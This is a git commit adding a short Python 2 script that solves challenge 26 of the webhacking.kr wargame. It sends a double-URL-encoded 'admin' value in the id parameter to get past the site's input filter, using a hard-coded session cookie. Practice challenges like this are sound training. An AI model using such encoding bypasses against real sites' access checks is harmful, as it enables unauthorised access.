3bd3e6f5683f1b3381885eacfedde44ec9b3359b
bindon <bindon@Creator-Note>
2018-07-29 14:50:44 +0900

    Clear Challenge26

---
+++ Challenge26.py
@@ -0,0 +1,23 @@
+#-*- coding: utf-8 -*-
+import urllib2
+import CookieManager
+
+challengeUrl = "http://webhacking.kr/challenge/web/web-11/"
+sessionId = "e28ad7cb81a98a13982054373940bf92"
+
+CookieManager.addCookie("PHPSESSID", sessionId)
+
+parameter = "%2561%2564%256d%2569%256e"
+httpRequest = urllib2.Request(challengeUrl + "?id=" + parameter)
+httpRequest.add_header("Cookie", CookieManager.getCookie())
+
+httpConnection = None
+try:
+    httpConnection = urllib2.urlopen(httpRequest)
+    httpResponse = httpConnection.read()
+    print httpResponse
+except:
+    raise
+finally:
+    if httpConnection != None:
+        httpConnection.close()
